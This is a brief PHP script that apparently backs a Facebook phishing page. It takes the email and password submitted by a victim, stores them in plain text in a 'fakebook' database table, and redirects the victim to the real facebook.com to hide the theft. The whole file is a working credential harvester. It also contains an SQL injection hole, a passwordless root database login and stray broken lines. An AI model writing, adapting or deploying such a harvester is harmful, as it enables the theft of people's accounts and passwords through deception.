<?php
$email = $_POST['email'];
$password = $_POST['password'];
 "email" .$email;
 "password" .$password;
$con = @mysql_connect('localhost', 'root', '');
mysql_select_db('fakebook', $con);
 
$sql="INSERT INTO `fbusers` (`email`, `password`) VALUES ( '$email', '$password')";
 
$result = mysql_query($sql);
 



header("Location: https://facebook.com/");

 
mysql_close($con)
?>?

 